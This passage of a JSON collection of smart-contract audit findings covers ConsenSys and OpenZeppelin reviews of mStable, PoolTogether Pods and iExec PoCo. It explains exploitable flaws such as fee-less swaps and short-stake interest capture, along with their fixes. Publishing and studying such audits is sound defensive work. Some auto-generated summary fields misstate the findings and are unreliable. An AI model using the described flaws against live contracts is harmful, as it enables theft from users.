      "content": "#### Resolution\n\n\n\nit was acknowledged that unexpected changes in behaviour by the integrated lending pools could potentially cause issues; However, it was decided that the risk is minor since the current lending pool behaviour is known and the fact that lending pools might introduce severe changes is accounted for by keeping the integrations separate and upgradable such that governance can react these changes in time.\n\n\n#### Description\n\n\nThe code makes several assumptions about the Aave and Compound integrations. A malicious or malfunctioning integration (or lending pool) might violate those assumptions. This might lead to unintended behavior in the system. Below are three such assumptions:\n\n\n1. function `checkBalance` reverts if the token hasn’t been added:\n\n\n**code/contracts/masset/BasketManager.sol:L317**\n\n\n\n```\nIPlatformIntegration(\\_integration).checkBalance(\\_bAsset);\n\n```\n2. function `withdraw` is trusted to not fail when it shouldn’t:\n\n\n**code/contracts/masset/Masset.sol:L611**\n\n\n\n```\nIPlatformIntegration(\\_integrators[i]).withdraw(\\_recipient, bAsset, q, \\_bAssets[i].isTransferFeeCharged);\n\n```\n3. the mapping from mAssets to pTokens is fixed:\n\n\n**code/contracts/masset/platform-integrations/InitializableAbstractIntegration.sol:L119**\n\n\n\n```\nrequire(bAssetToPToken[\\_bAsset] == address(0), \"pToken already set\");\n\n```\nThe first assumption could be avoided by adding a designated function to check if the token was added.\n\n\nThe second assumption is more difficult to avoid, but should be considered when adding new integrations. The system needs to trust the lending pools to work properly; for instance, if the lending pool would blacklist the integration contract the system may behave in unintended ways.\n\n\nThe third assumption could be avoided, but it comes at a cost.\n\n\n#### Recommendation\n\n\nConsider revisiting or avoiding these assumptions. For any assumptions that are there by design it would be good to document them to facilitate future changes. One should also be careful to avoid coupling between external systems. For instance, if withdrawing from Aave fails this should not prevent withdrawing from Compound.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13634",
      "title": "Assumptions are made about interest distribution  Won't Fix",
      "impact": "LOW",
      "content": "#### Description\n\n\nThere is a mechanism that prevents interest collection if the extrapolated APY exceeds a threshold (MAX\\_APY).\n\n\n**code/contracts/savings/SavingsManager.sol:L174**\n\n\n\n```\nrequire(extrapolatedAPY < MAX\\_APY, \"Interest protected from inflating past maxAPY\");\n\n```\nThe extrapolation seems to assume that the interest is payed out frequently and continuously. It seems like a less frequent payout (for instance, once a month/year) could be rejected since the extrapolation considers the interest since the last time that `collectAndDistributeInterest` was called (potentially without interest being collected).\n\n\n#### Recommendation\n\n\nConsider revisiting or documenting this assumption. For instance, one could consider extrapolating between the current time and the last time that **(non-zero) interest was actually collected**.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13633",
      "title": "Unused event BasketStatusChanged  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis event will be used in future releases.\n\n\n#### Description\n\n\nIt seems like the event `BasketManager.BasketStatusChanged` event is unused.\n\n\n#### Recommendation\n\n\nConsider removing the event declaration to improve the readability of the code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13632",
      "title": "Unused parameter in BasketManager._addBasset  Won't Fix",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nWhile the parameter is not currently used it will be used in future mAssets such as mGOLD.\n\n\n#### Description\n\n\nIt seems like the `_measurementMultiple` parameter is always `StableMath.getRatioScale()` (1e8). There is also some range validation code that seems unnecessary if the parameter is always 1e8.\n\n\n**code/contracts/masset/BasketManager.sol:L310**\n\n\n\n```\nrequire(\\_measurementMultiple >= 1e6 && \\_measurementMultiple <= 1e10, \"MM out of range\");\n\n```\n#### Recommendation\n\n\nConsider removing the parameter and the input validation to improve the readability of the code.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13631",
      "title": "Removing a bAsset might leave some tokens stuck in the vault  Acknowledged",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThe issue was acknowledged and downgraded to ‘minor’ risk as only very small token amounts can be affected. A fix will be triaged for a future update.\n\n\n#### Description\n\n\nIn function `_removeBasset` there is existing validation to make sure only “empty” vaults are removed:\n\n\n**code/contracts/masset/BasketManager.sol:L464**\n\n\n\n```\nrequire(bAsset.vaultBalance == 0, \"bAsset vault must be empty\");\n\n```\nHowever, this is not necessarily sufficient since the lending pool balance may be higher than the vault balance. The reason is that the vault balance is usually slightly out-of-date due to the 30 minutes time span between interest collections. Consider the scenario: (1) a user swaps out an asset 29 minutes after the last interest collection to reduce its vault balance from 100 USD to 0, and (2) the governor subsequently remove the asset. During those 29 minutes the asset was collecting interest (according to the lending pool the balance was higher than 100 USD at the time of the swap) that is now “stuck” in the vault.\n\n\n#### Recommendation\n\n\nConsider adding additional input validation (for instance, by requiring that the lending pool balance to be 0) or triggering a swap directly when removing an asset from the basket.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13630",
      "title": "Missing validation in Masset._redeemTo  Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAn explicit check will be added with the next Masset proxy upgrade.\n\n\n#### Description\n\n\nIn function `_redeemTo` the collateralisation ratio is not taken into account unlike in `_redeemMasset`:\n\n\n**code/contracts/masset/Masset.sol:L558-L561**\n\n\n\n```\nuint256 colRatio = StableMath.min(props.colRatio, StableMath.getFullScale());\n\n// Ensure payout is related to the collateralised mAsset quantity\nuint256 collateralisedMassetQuantity = \\_mAssetQuantity.mulTruncate(colRatio);\n\n```\nIt seems like `_redeemTo` should not be executed if the collateralisation ratio is below 100%. However, the contracts (that is, `Masset` and `ForgeValidator`) themselves don’t seem to enforce this explicitly. Instead, the governor needs to ensure that the collateralisation ratio is only set to a value below 100% when the basket is not “healthy” (for instance, if it is considered “failed”). Failing to ensure this may allow an attacker to redeem a disproportionate amount of assets. Note that the functionality for setting the collateralisation ratio is not currently implemented in the audited code.\n\n\n#### Recommendation\n\n\nConsider enforcing the intended use of `_redeemTo` more explicitly. For instance, it might be possible to introduce additional input validation by requiring that the collateralisation ratio is not below 100%.",
      "summary": "\nA bug was discovered in the Masset proxy code where the collateralisation ratio was not taken into account when executing the `_redeemTo` function. This could potentially allow an attacker to redeem a disproportionate amount of assets. The code itself does not enforce this explicitly, and instead relies on the governor to ensure that the collateralisation ratio is only set to a value below 100% when the basket is not “healthy”. To resolve the issue, the recommendation is to add additional input validation by requiring that the collateralisation ratio is not below 100%. An explicit check will be added with the next Masset proxy upgrade.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13629",
      "title": "Internal accounting of vault balance may diverge from actual token balance in lending pool  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAfter discussion with the team the risk of this invariant violation was considered negligible as the gas cost increase for querying constantly querying the lending pool would outweigh the size of the accounting error of only 1 base unit.\n\n\n#### Description\n\n\nIt is possible that the vault balance for a given bAsset is greater than the corresponding balance in the lending pool. This violates one of the correctness properties stated in the audit brief. Our Harvey fuzzer was able to generate a transaction that mints a small amount (0xf500) of mAsset. Due to the way that the lending pool integration (Compound in this case) updates the vault balance it ends up greater than the available balance in the lending pool.\n\n\nMore specifically, the integration contract assumes that the amount deposited into the pool is equal to the amount received by the mAsset contract for the case where no transaction fees are charged for token transfers:\n\n\n**code/contracts/masset/platform-integrations/CompoundIntegration.sol:L45-L58**\n\n\n\n```\nquantityDeposited = \\_amount;\n\nif(\\_isTokenFeeCharged) {\n    // If we charge a fee, account for it\n    uint256 prevBal = \\_checkBalance(cToken);\n    require(cToken.mint(\\_amount) == 0, \"cToken mint failed\");\n    uint256 newBal = \\_checkBalance(cToken);\n    quantityDeposited = \\_min(quantityDeposited, newBal.sub(prevBal));\n} else {\n    // Else just execute the mint\n    require(cToken.mint(\\_amount) == 0, \"cToken mint failed\");\n}\n\nemit Deposit(\\_bAsset, address(cToken), quantityDeposited);\n\n```\nFor illustration, consider the following scenario: assume your current balance in a lending pool is 0. When you deposit some amount X into the lending pool your balance after the deposit may be less than X (even if the underlying token does not charge transfer fees). One reason for this is rounding, but, in theory, a lending pool could also charge fees, etc.\n\n\nThe vault balance is updated in function `Masset._mintTo` based on the amount returned by the integration.\n\n\n**code/contracts/masset/Masset.sol:L189**\n\n\n\n```\nbasketManager.increaseVaultBalance(bInfo.index, integrator, quantityDeposited);\n\n```\n**code/contracts/masset/Masset.sol:L274**\n\n\n\n```\nuint256 deposited = IPlatformIntegration(\\_integrator).deposit(\\_bAsset, quantityTransferred, \\_erc20TransferFeeCharged);\n\n```\nThis violation of the correctness property is temporary since the vault balance is readjusted when interest is collected. However, the time frame of ca. 30 minutes between interest collections (may be longer if no continuous interest is distributed) means that it may be violated for substantial periods of time.\n\n\n**code/contracts/masset/BasketManager.sol:L243-L249**\n\n\n\n```\nuint256 balance = IPlatformIntegration(integrations[i]).checkBalance(b.addr);\nuint256 oldVaultBalance = b.vaultBalance;\n\n// accumulate interest (ratioed bAsset)\nif(balance > oldVaultBalance && b.status == BassetStatus.Normal) {\n    // Update balance\n    basket.bassets[i].vaultBalance = balance;\n\n```\nThe regular updates due to interest collection should ensure that the difference stays relatively small. However, note that the following scenarios is feasible: assuming there is 0 DAI in the basket, a user mints X mUSD by depositing X DAI. While the interest collection hasn’t been triggered yet, the user tries to redeem X mUSD for DAI. This may fail since the amount of DAI in the lending pool is smaller than X.\n\n\n#### Recommendation\n\n\nIt seems like this issue could be fixed by using the balance increase from the lending pool to update the vault balance (much like for the scenario where transfer fees are charged) instead of using the amount received.",
      "summary": "\nA bug was discovered in the Masset code that violates one of the correctness properties stated in the audit brief. This bug occurs when the balance in a lending pool is greater than the corresponding balance in the vault. The Harvey fuzzer was able to generate a transaction that mints a small amount of mAsset, which causes the vault balance to be greater than the available balance in the lending pool. This is due to the way that the lending pool integration updates the vault balance. The vault balance is updated in function Masset._mintTo based on the amount returned by the integration. This violation of the correctness property is temporary since the vault balance is readjusted when interest is collected. However, the time frame of ca. 30 minutes between interest collections (may be longer if no continuous interest is distributed) means that it may be violated for substantial periods of time. The team has discussed and concluded that the risk of this invariant violation is negligible as the gas cost increase for querying constantly querying the lending pool would outweigh the size of the accounting error of only 1 base unit. The bug could be fixed by using the balance increase from the lending pool to update the vault balance instead of using the amount received.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13628",
      "title": "Users can collect interest from SavingsContract by only staking mTokens momentarily ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThe blocker on collecting interest more than once in 30 minute period. A new APY bounds check has been added to verify that supply isn’t inflated by more than 0.1% within a 30 minutes window.\n\n\n#### Description\n\n\nThe SAVE contract allows users to deposit mAssets in return for lending yield and swap fees. When depositing mAsset, users receive a “credit” tokens at the momentary credit/mAsset exchange rate which is updated at every deposit. However, the smart contract enforces a minimum timeframe of 30 minutes in which the interest rate will not be updated. A user who deposits shortly before the end of the timeframe will receive credits at the stale interest rate and can immediately trigger and update of the rate and withdraw at the updated (more favorable) rate after the 30 minutes window. As a result, it would be possible for users to benefit from interest payouts by only staking mAssets momentarily and using them for other purposes the rest of the time.\n\n\n#### Examples\n\n\n**code/contracts/savings/SavingsManager.sol:L141-L143**\n\n\n\n```\n// 1. Only collect interest if it has been 30 mins\nuint256 timeSinceLastCollection = now.sub(previousCollection);\nif(timeSinceLastCollection > THIRTY\\_MINUTES) {\n\n```\n\n#### Recommendation\n\n\nRemove the 30 minutes window such that every deposit also updates the exchange rate between credits and tokens. Note that this issue was reported independently during the bug bounty program and a fix is currently being worked on.",
      "summary": "\nA bug was reported in the SAVE contract which allows users to deposit mAssets in return for lending yield and swap fees. The bug allowed users to collect interest more than once in a 30 minute period, inflating the supply by more than 0.1%. The 30 minute window was enforced by a check in the SavingsManager.sol code. To fix this issue, the 30 minute window was removed so that every deposit also updates the exchange rate between credits and tokens. A fix is currently being worked on as part of the bug bounty program.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "13627",
      "title": "Swap fees can be bypassed using redeemMasset ✓ Addressed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nThis issue was reported independently via the bug bounty program and was [fixed early during the audit](https://github.com/mstable/mStable-contracts/pull/92). The fix has already been deployed on mainnet using the upgrade mechanism\n\n\n#### Description\n\n\nPart of the value proposition for liquidity providers is earning fees incurred for swapping between assets. However, traders can perform fee-less swaps by providing liquidity in one bAsset, followed by calling `redeemMasset()` to convert the resulting mAssets back into a proportional amount of bAssets. Since removing liquidity via `redeemMasset()` does not incur a fee this is equivalent to doing a swap with zero fees.\n\n\nAs a very simple example, assuming a pool with 2 bAssets (say, DAI and USDT), it would be possible to swap 10 DAI to USDT as follows:\n\n\n1. Add 20 DAI to the pool, receive 20 mUSD\n2. call redeemMasset() to redeem 10 DAI and 10 USDT\n\n\n#### Examples\n\n\nThe boolean argument `applyFee` is set to `false` in `_redeemMasset`:\n\n\n**code/contracts/masset/Masset.sol:L569**\n\n\n\n```\n\\_settleRedemption(\\_recipient, \\_mAssetQuantity, props.bAssets, bAssetQuantities, props.indexes, props.integrators, false);\n\n```\n#### Recommendation\n\n\nCharge a small redemption fee in `redeemMasset()`.",
      "summary": "\nThis bug report is about an issue with liquidity providers not earning fees when traders perform fee-less swaps by providing liquidity in one bAsset, followed by calling `redeemMasset()` to convert the resulting mAssets back into a proportional amount of bAssets. This is possible because the boolean argument `applyFee` is set to `false` in the `_redeemMasset` function. The bug was reported independently via the bug bounty program and was fixed early during the audit. The fix has already been deployed on mainnet using the upgrade mechanism. The recommendation is to charge a small redemption fee in `redeemMasset()` to prevent this issue from happening again.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "mStable 1.1",
      "source_link": "https://consensys.net/diligence/audits/2020/07/mstable-1.1/",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "11474",
      "title": "[L03] Complicated Code",
      "impact": "LOW",
      "content": "There are cases where the data structure leads to unnecessarily complicated code. In particular the scheduled balances track the `previousBalance` and `lastBalance` separately. However, [the only time the previous balance is updated](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/ScheduledBalance.sol#L67) occurs immediately after the [balance is consolidated](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L179), and only when the `currentTimestamp` is after the `lastTimestamp`. In this case, the `previousBalance` will be increased by zero. This implies it will always be zero.\n\n\nThis fact is not obvious, but it is implicitly assumed when the scheduled balances are converted to tokens (since all balances use the same exchange rate, no matter when they were added). While correct, it makes the code harder to reason about.\n\n\nConsider simplifying the scheduled balance data structure to record a single balance with its timestamp.\n\n\n**Update:** *Fixed in [PR#7](https://github.com/pooltogether/pods/pull/7/). The data structure was updated as suggested and the `ScheduledBalance` and `Pod` contracts were updated accordingly.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether – Pods Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-pods-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11473",
      "title": "[L02] Misleading comments",
      "impact": "LOW",
      "content": "Some of the code comments could be clearer.  \n\n– In [line 85 of FixedPoint.sol](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/FixedPoint.sol#L85): `fixed point 18 number` should be `fixed point 18 mantissa` to be consistent with the convention used in the code base.  \n\n– In [line 106](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/ExchangeRateTracker.sol#L106) and [line 119](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/ExchangeRateTracker.sol#L119) of `ExchangeRateTracker.sol`: the phrase `in the past` should be `at the specified timestamp`.  \n\n– In [line 80](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L80) and [line 91](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L91) of `Pod.sol`: `burned` should be `redeemed`  \n\n– In [line 113 of Pod.sol](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L113): `debited` should be `credited`\n\n\n**Update:** *Fixed in [PR#6](https://github.com/pooltogether/pods/pull/6/). The comments were updated appropriately.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether – Pods Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-pods-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11472",
      "title": "[L01] Missing return value",
      "impact": "LOW",
      "content": "The [clearConsolidated function signature](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/ScheduledBalance.sol#L160) claims the function returns a `uint256` but it doesn’t return anything. Additionally, its return value is not checked in the [the only place it is used](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L449).\n\n\nConsider removing the return value from the function signature.\n\n\n**Update:** *Fixed in [PR#5](https://github.com/pooltogether/pods/pull/5/). The return value was removed from the `clearConsolidated` function signature.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether – Pods Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-pods-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11471",
      "title": "[M01] Incomplete ERC777 functionality",
      "impact": "MEDIUM",
      "content": "When a user deposits funds into a pod, they are [scheduled to receive Pod tokens](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L185) after the current draw. Conceptually, when the draw is over, they should have full access to the ERC777 functionality of their Pod tokens. In practice, they only receive the tokens once [consolidateBalanceOf](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L459) is called (which occurs on any subsequent state-changing interaction with the Pod-specific functions).\n\n\nIn the mean time, the `send`, `transfer` and `transferFrom` functions do not account for the new tokens.\n\n\nConsider extending these methods to call `consolidateBalanceOf`. Alternatively, consider making `consolidateBalanceOf` a public function so users can manually consolidate their tokens.\n\n\n**Update:** *Fixed in [PR#4](https://github.com/pooltogether/pods/pull/4/). The `Pod` contract extends `send`, `operatorSend`, `transfer` and `transferFrom` to call `consolidateBalanceOf` on the relevant address before calling the corresponding parent method.*",
      "summary": "\nA bug was identified in the PoolTogether Pods system, where users who have deposited funds into a pod were not receiving their Pod tokens after a draw was over. The 'send', 'transfer', and 'transferFrom' functions did not account for the new tokens. \n\nThe bug was fixed by extending the methods to call 'consolidateBalanceOf' or making 'consolidateBalanceOf' a public function so users could manually consolidate their tokens. The fix was implemented in Pull Request #4.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether – Pods Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-pods-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11470",
      "title": "[H01] Deposit uses operator collateral",
      "impact": "HIGH",
      "content": "The `_deposit` function of the Pod contract [attempts to take collateral from the `operator`](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L180) but [credits it to the `from` address](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L185).\n\n\nIf successful, this effectively transfers funds from the operator to the `from` address. On the other hand, if the operator has insufficient funds or the Pod contract does not have approval, the [`operatorDeposit` function](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L151) will revert. Either scenario is undesirable.\n\n\nConsider updating the `transferFrom` arguments to retrieve collateral from the `from` address.\n\n\n**Update:** *Fixed in [PR#3](https://github.com/pooltogether/pods/pull/3/). Collateral is correctly taken from the `from` address.*",
      "summary": "\nThis bug report is about the `_deposit` function of the Pod contract, which is used to take collateral from the `operator` address and credit it to the `from` address. This transfer of funds from the operator to the `from` address can be successful, however, if the operator has insufficient funds or the Pod contract does not have approval, the `operatorDeposit` function will revert. The fix for this bug was to update the `transferFrom` arguments to retrieve collateral from the `from` address, which was done in Pull Request #3 and is now fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether – Pods Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-pods-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11469",
      "title": "[C01] Supply is manipulable",
      "impact": "HIGH",
      "content": "When a user deposits collateral, the total supply and their individual balance [are scheduled to be updated](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L184-L185) in the next draw. However, if the collateral is withdrawn before the next round, [the user’s individual balance is updated](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L292) but the supply is not.\n\n\nWhen the [supply is consolidated](https://github.com/pooltogether/pods/blob/8041b3dc72efd02b94d49fb37b9b308603af5ce/contracts/Pod.sol#L444), additional Pod tokens will be minted that are not assigned to any user.\n\n\nSubsequently, when the pod wins a lottery, the new Pool tokens will be spread evenly over all Pod tokens, even the ones that are unassigned. This means that users will receive less than their fair share of the winnings.\n\n\nConsider updating the scheduled supply when withdrawing a pending deposit. More generally, consider abstracting the interaction with scheduled user balances and supply so they are both updated with the same call.\n\n\n**Update:** *Fixed in [PR#2](https://github.com/pooltogether/pods/pull/2/). The supply is updated when withdrawing a pending deposit.*",
      "summary": "\nThis bug report is about an issue with the PoolTogether Pods protocol. When a user deposits collateral, the total supply and their individual balance are scheduled to be updated in the next draw. However, if the user withdraws their collateral before the next round, their individual balance is updated but the supply is not. This means that when the supply is consolidated, additional Pod tokens will be minted that are not assigned to any user. This causes an issue when the pod wins a lottery, as the new Pool tokens will be spread evenly over all Pod tokens, including the unassigned ones. This results in users receiving less than their fair share of the winnings. \n\nThe bug was fixed in PR#2, where the supply is now updated when withdrawing a pending deposit. Additionally, the interaction between scheduled user balances and supply has been abstracted, so they are both updated with the same call.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "PoolTogether – Pods Audit",
      "source_link": "https://blog.openzeppelin.com/pooltogether-pods-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13761",
      "title": "The updateContract() method in ERC1538UpdateDelegate is incorrectly implemented",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue was fixed in [iExecBlockchainComputing/[email protected]`e6be083`](https://github.com/iExecBlockchainComputing/iexec-solidity/commit/e6be08303da4a1d5f1d4978e354b59570b3d00f9)\n\n\n#### Description\n\n\nThe `updateContract()` method in `ERC1538UpdateDelegate` does not behave as intended for some specific streams of bytes (meant to be parsed as function signatures).\n\n\nThe mentioned function takes as input, among other things, a `string` (which is, canonically, a dynamically-sized `bytes` array) and tries to parse it as a conjunction of [function signatures](https://solidity.readthedocs.io/en/v0.6.4/abi-spec.html#function-selector).\n\n\nAs is evident in:\n\n\n**code/iexec-solidity/contracts/ERC1538/ERC1538Update.sol:L39**\n\n\n\n```\nif (char == 0x3B) // 0x3B = ';'\n\n```\nInside the function, `;` is being used as a “reserved” character, serving as a delimiter between each function signature.\n\n\nHowever, if two semicolons are used in succession, the second one will not be checked and will be made part of the function signature being sent into the `_setFunc()` method.\n\n\n#### Example of faulty input\n\n\n`someFunc;;someOtherFuncWithSemiColon;`\n\n\n#### Recommendation\n\n\nReplace the line that increases the `pos` counter at the end of the function:\n\n\n**code/iexec-solidity/contracts/ERC1538/ERC1538Update.sol:L47**\n\n\n\n```\nstart = ++pos;\n\n```\nWIth this line of code:\n\n\n`start = pos + 1;`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "iExec PoCo",
      "source_link": "https://consensys.net/diligence/audits/2020/03/iexec-poco/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13760",
      "title": "Limit the length of task.contributors to prevent reaching gasBlockLimit  Acknowledged",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nUpdate from the iExec team:\n\n\nAny hardcoded lock would be a restriction in the future if thee block size increases.\nIn addition to that, workers are strongly incentivised to not contribute if it would result in a deadlocked task.\nSchedulers are incentivised to not authorise too many workers to contribute (they also lose stake if a task get deadlocked).\nSo the development team has assessed the risk as low.\n\n\nIn the unlikely event the described flaw still happens, the task will get in a deadlocked state, until at some point the block size limit is increased and a claim becomes possible.\nBecause in a world where block size increases are possible, deadlocks are not eternal.\n\n\n\n\n#### Description\n\n\nIt is recommended to limit the length of arrays that the contract iterates through to prevent system halts. `task.contributors` is used within iExec contract in many functions, and main functions such as `claim()`, `reOpen()`, and most importantly `contribute()` (through calling `checkConsensus()`) iterate through this list.\n\n\nGiven that contributions are not free and they could only block the task they are contributing to, this is a low impact issue.\n\n\n#### Recommendation\n\n\nThe fix is trivial to implement and only requires to limit the number of items in `task.contributors` to the maximum imagined for the system (based on client communication this number could be 20, although further testing should be done to make sure with this number does not reach the blockGasLimit, possibly with future changes in the opcode pricing).",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "iExec PoCo",
      "source_link": "https://consensys.net/diligence/audits/2020/03/iexec-poco/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13759",
      "title": "Domain separator in iExecMaintenanceDelegate has a wrong version field  Acknowledged",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue was fixed in [iExecBlockchainComputing/[email protected]`ebee370`](https://github.com/iExecBlockchainComputing/PoCo-dev/commit/ebee370982fa84ba63566127c5ed08c238314489)\n\n\n#### Description\n\n\nThe domain separator used to comply with the EIP712 standard in `iExecMaintenanceDelegate` has a wrong version field.\n\n\n**code/poco-dev/contracts/modules/delegates/IexecMaintenanceDelegate.sol:L77-L86**\n\n\n\n```\nfunction \\_domain()\ninternal view returns (IexecLibOrders\\_v5.EIP712Domain memory)\n{\n\treturn IexecLibOrders\\_v5.EIP712Domain({\n\t\tname:              \"iExecODB\"\n\t, version:           \"3.0-alpha\"\n\t, chainId:           \\_chainId()\n\t, verifyingContract: address(this)\n\t});\n}\n\n```\nIn the above snippet we can see the code is still using the version field from an old version of the PoCo protocol, `\"3.0-alpha\"`.\n\n\n#### Recommendation\n\n\nChange the version field to: `\"5.0-alpha\"`",
      "summary": "\nThis bug report is about an issue in the `iExecMaintenanceDelegate` domain separator, which is used to comply with the EIP712 standard. The problem is that the version field used is from an old version of the PoCo protocol, `\"3.0-alpha\"`. The recommendation is to change the version field to `\"5.0-alpha\"` in order to fix the issue. The bug was fixed in the commit `ebee370982fa84ba63566127c5ed08c238314489` in the repository `iExecBlockchainComputing/PoCo-dev`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "iExec PoCo",
      "source_link": "https://consensys.net/diligence/audits/2020/03/iexec-poco/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Gonçalo Sá",
        "Shayan Eskandari"
      ]
    },
    {
      "id": "13758",
      "title": "Outdated documentation  Acknowledged",
      "impact": "MEDIUM",
